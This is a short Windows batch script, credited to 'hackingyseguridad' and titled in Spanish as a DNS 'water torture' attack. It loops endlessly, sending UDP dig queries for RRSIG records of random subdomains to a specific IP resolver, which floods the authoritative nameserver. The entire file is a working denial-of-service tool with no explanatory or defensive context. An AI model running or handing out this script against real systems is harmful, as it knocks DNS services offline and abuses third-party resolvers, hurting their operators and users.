@ECHO OFF
ECHO Water Torture DNS autoritativo. (c) hackingyseguridad 2016. Version 2.
:loop
SET/A ran=%random%
dig @118.174.15.254 +notcp RRSIG %ran%.hackingyseguridad.es
goto loop